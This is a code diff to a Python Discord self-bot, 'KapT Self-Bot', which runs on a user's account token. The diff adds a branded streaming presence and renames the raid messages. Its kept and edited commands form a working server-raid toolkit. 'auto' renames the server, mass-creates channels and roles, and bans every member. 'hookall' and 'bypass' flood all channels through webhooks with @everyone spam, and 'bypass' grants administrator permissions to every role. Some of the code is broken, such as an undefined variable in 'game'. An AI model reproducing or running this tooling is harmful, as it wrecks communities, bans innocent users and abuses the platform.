@@ -16,19 +16,33 @@ import os
 class SELFBOT():
     __version__ = 1
 
+application_id = 1048594623062351952
+large_image_id = 1048596984862347294
 
 with open("cong.json") as f:
     j = json.load(f)
     token = j["token"]
     prefix = j["prefix"]
-client = commands.Bot(command_prefix=prefix, intents=intents, self_bot=True)
+client = commands.Bot(command_prefix=prefix, self_bot=True)
 client.remove_command("help")
 
 # Events
 
-
 @client.event
 async def on_ready():
+	await client.change_presence(
+		activity = discord.Activity(
+			type=discord.ActivityType.streaming,
+			application_id = application_id,
+			name = "KapT Self-Bot",
+            details = "KapT Self-Bot",
+			assets = {
+			  'large_image' : str(large_image_id),
+			  'large_text':f'https://t.me/kapt_self_bot'
+			},
+			url = "https://twitch.tv/kapt"
+			)
+		)
     print(Fore.GREEN + f"""
 ██╗░░██╗░░░░░░██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗
 ██║░██╔╝░░░░░░██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝
@@ -298,8 +312,6 @@ async def utility(ctx):
 *[] Is Required, <> Is Optional*
 **AV <member>**
 `Shows The Mentioned Users Avatar`
-**Creator**
-`Shows This SelfBots Creator`
 **Ping**
 `Shows The Clients Latency`
 **Info**
@@ -444,7 +456,9 @@ async def nuke(ctx):
 **Auto**
 `Start auto crash`
 **Hookall**
-`Start spamming webhooks to all channels`""")
+`Start spamming webhooks to all channels`
+**Spamv2**
+`Start spaming in channel`""")
 
 
 @client.command()
@@ -643,7 +657,7 @@ async def mute(ctx, member: discord.Member):
 
 
 @client.command()
-async def purge(ctx, *, amount):
+async def purge(ctx, amount=100):
     await ctx.message.delete()
     await ctx.channel.purge(limit=amount)
 
@@ -755,8 +769,7 @@ async def dmlist(ctx, *, x):
 async def level(ctx):
     await ctx.message.delete()
     responses = [
-        'Cry about it', 'Cartier the best coder', 'We love you KapT',
-	'Cartier the skid 🥶', 'Shut the up'
+        'Cry about it', 'We love you KapT', 'Shut the up'
     ]
     answer = random.choice(responses)
     await ctx.send(answer)
@@ -902,18 +915,6 @@ async def av(ctx, member: discord.Member = None):
 
 
 @client.command()
-async def creator(ctx):
-    await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              title="Creator!",
-                              description="Cartier, <@889918463546650644>")
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__Creator__**\n\nCartier, <@889918463546650644>""")
-
-
-@client.command()
 async def ping(ctx):
     await ctx.message.delete()
     msg = await ctx.send("Pinging...")
@@ -968,24 +969,18 @@ async def dumpemojis(ctx, server_id: int = None):
             server = ctx.guild
         else:
             server = discord.utils.get(ctx.bot.guilds, id=server_id)
-
         emojiNum = len(server.emojis)
-
         folderName = 'Emojis/' + server.name.translate(
             {ord(c): None
              for c in '/<>:"\\|?*'})
-
         if emojiNum > 0:
             if not os.path.exists(folderName):
                 os.makedirs(folderName)
         for emoji in server.emojis:
-
             if emoji.animated:
                 fileName = folderName + '/' + emoji.name + '.gif'
-
             else:
                 fileName = folderName + '/' + emoji.name + '.png'
-
             if not os.path.exists(fileName):
                 with open(fileName, 'wb') as outFile:
                     req = urllib.request.Request(
@@ -1002,14 +997,24 @@ async def dumpemojis(ctx, server_id: int = None):
 @client.command()
 async def game(ctx):
     await ctx.message.delete()
-    await client.change_presence(
-    	activity=discord.Activity(type=discord.ActivityType.playing, name='KapT SelfBot'))
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, application_id = application_id, name='KapT Self-Bot', details=f"{x}", assets={'large_image': str(large_image_id), 'large_text': 'https://t.me/kapt_self_bot'}))
 
 @client.command()
-async def stream(ctx):
+async def stream(ctx, *, x):
     await ctx.message.delete()
     await client.change_presence(
-        activity=discord.Streaming(name='KapT SelfBot', url="https://twitch.tv/kapt"))
+		activity = discord.Activity(
+			type=discord.ActivityType.streaming,
+			application_id = application_id,
+			name = "KapT Self-Bot",
+            details = f"{x}",
+			assets = {
+			  'large_image' : str(large_image_id),
+			  'large_text':f'https://t.me/kapt_self_bot'
+			},
+			url = "https://twitch.tv/kapt"
+			)
+		)
 
 @client.command()
 async def listen(ctx):
@@ -1121,34 +1126,17 @@ async def auto(ctx):
         except: pass
     with open('crash.png', 'rb') as f:
         icon = f.read()
-        try: await ctx.guild.edit(name="Crashed by SelfBot-Kapt", icon=icon)
+        try: await ctx.guild.edit(name="Crashed by KapT-SelfBot", icon=icon)
         except: pass
     for _ in range(50):
-        try: await ctx.guild.create_text_channel(name="crash-by-SelfBot-Kapt")
+        try: await ctx.guild.create_text_channel(name="crash-by-KapT-SelfBot")
         except: pass
     for _ in range(50):
-        try: await ctx.guild.create_role(name="Crashed by SelfBot-Kapt")
+        try: await ctx.guild.create_role(name="Crashed by KapT-SelfBot")
         except: pass
     for member in ctx.guild.members:
         try: await member.ban()
         except: pass
-    for channel in ctx.guild.text_channels:
-        if member.permissions_in(channel).manage_webhooks:
-            webhoks = await channel.webhooks()
-            if len(webhoks) > 50:
-                for webhook in webhoks:
-                    whlist.append(webhook)
-            else:
-                webhook = await channel.create_webhook(name="Crashed by SelfBot-Kapt")
-                whlist.append(webhook)
-    while True:
-        for webhook in whlist:
-            try: await webhook.send('''
-@everyone @here
-Crashed by SelfBot-Kapt
-https://github.com/KapTaBka/KapT-Self-Bot
-''', username = "Crashed by SelfBot-Kapt")
-            except: pass
 
 @client.command()
 async def hookall(ctx):
@@ -1161,19 +1149,19 @@ async def hookall(ctx):
                 for webhook in webhoks:
                     whlist.append(webhook)
             else:
-                webhook = await channel.create_webhook(name="Crashed by SelfBot-Kapt")
+                webhook = await channel.create_webhook(name="Crashed by KapT-SelfBot")
                 whlist.append(webhook)
     while True:
         for webhook in whlist:
             try: await webhook.send('''
 @everyone @here
-Crashed by SelfBot-Kapt.
+Crashed by KapT-SelfBot
 https://github.com/KapTaBka/KapT-Self-Bot
 ''', username = "Crashed by SelfBot-Kapt")
             except: pass
 
 @client.command()
-async def spamv2(ctx, num=100, *, text='@everyone @here Crashed by SelfBot-Kapt'):
+async def spamv2(ctx, num=100, *, text='@everyone @here Raid by KapT-SelfBot'):
 	if num == 0 or text in ['']:
 		await ctx.send(f'')
 	else:
@@ -1203,34 +1191,34 @@ async def dellall(ctx):
 async def bypass(ctx):
     for role in ctx.guild.roles:
         try:
-            await role.edit(name="Crashed by SelfBot-Kapt", permissions=discord.Permissions(permissions=8))
+            await role.edit(name="Crashed by KapT-SelfBot", permissions=discord.Permissions(permissions=8))
         except:
             pass
         else:
             pass
     for channel in ctx.guild.channels:
         try:
-            await channel.edit(name=f"Crashed by SelfBot-Kapt-{random.randint(1, 1000)}", topic="Crashed by SelfBot-Kapt")
+            await channel.edit(name=f"Crashed by KapT-SelfBot-{random.randint(1, 1000)}", topic="Crashed by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot")
         except:
             pass
         else:
             pass
     for chan in ctx.guild.text_channels:
         try:
-            hell = await chan.create_webhook(name='Crashed by SelfBot-Kapt')
+            hell = await chan.create_webhook(name='Crashed by KapT-SelfBot')
         except:
             pass
     for i in range(30):
         for channels in ctx.guild.text_channels:
             hooks = await channels.webhooks()
             for hook in hooks:
-                await hook.send('@everyone @here Crashed by SelfBot-Kapt https://github.com/KapTaBka/KapT-Self-Bot')
+                await hook.send('@everyone @here Crashed by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot')
 
 async def sendhook(ctx, channelm):
 		for i in range(100):
 			hooks = await channelm.webhooks()
 			for hook in hooks:
-				await hook.send('@everyone @here raid by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot!')
+				await hook.send('@everyone @here Crash by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot!')
 
 @client.command(pass_contex=True)
 async def spam(ctx, amount: int, *, message):
@@ -1239,6 +1227,7 @@ async def spam(ctx, amount: int, *, message):
         await ctx.send(message)
 
 # Personal
+
 @client.command()
 async def delguild(ctx):
 	try:
@@ -1261,7 +1250,8 @@ async def reactionall( ctx, amount: int):
 	messages = await ctx.channel.history(limit=amount).flatten()
 	reactioned=0
 	for message in messages:
-		await message.add_reaction("🤖")
+		await message.add_reaction("🐱")
+		await message.add_reaction("✅")
 		reactioned+=1
 	await ctx.send(f"**:white_check_mark: Successfully set reactions to {reactioned} messages!**")
 
@@ -1455,40 +1445,6 @@ async def serverinfo(ctx):
         embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
                               timestamp=ctx.message.created_at)
         roles = [role for role in ctx.guild.roles[::-1]]
-        embed.set_author(name="𝙎𝙀𝙍𝙑𝙀𝙍𝙄𝙉𝙁𝙊", icon_url=ctx.guild.icon_url)
-        embed.set_thumbnail(url=ctx.guild.icon_url)
-        embed.set_image(url=ctx.guild.banner_url)
-        embed.add_field(name="**Server Name:**",
-                        value=f"{ctx.guild.name}",
-                        inline=False)
-        embed.add_field(name="**Server ID:**",
-                        value=f"{ctx.guild.id}",
-                        inline=False)
-        embed.add_field(name="**Server Owner:**",
-                        value=f"{ctx.guild.owner}",
-                        inline=False)
-        embed.add_field(name="**Server Roles:**",
-                        value=f"{len(ctx.guild.roles)}",
-                        inline=False)
-        embed.add_field(name="**Role Names:**",
-                        value="\n".join([role.name for role in roles]),
-                        inline=False)
-        embed.add_field(name="**Server Text Channels:**",
-                        value=f"{len(ctx.guild.text_channels)}",
-                        inline=False)
-        embed.add_field(name="**Server Voice Channels:**",
-                        value=f"{len(ctx.guild.voice_channels)}",
-                        inline=False)
-        embed.add_field(name="**Server Categories:**",
-                        value=f"{len(ctx.guild.categories)}",
-                        inline=False)
-        embed.add_field(name="**Boosts:**",
-                        value=f"{ctx.guild.premium_subscription_count}",
-                        inline=False)
-        embed.add_field(name="**Members:**",
-                        value=f"{ctx.guild.member_count}",
-                        inline=False)
-        await ctx.send(embed=embed)
     except:
         await ctx.send(f"""**__SERVERINFO__**
         
@@ -1544,7 +1500,7 @@ async def serverchannels(ctx):
 
 
 @client.command()
-async def copy(ctx):  # b'\xfc'
+async def copy(ctx):
     await ctx.message.delete()
     await client.create_guild(f'KapTSelfbot-Copy-{ctx.guild.name}')
     await asyncio.sleep(4)
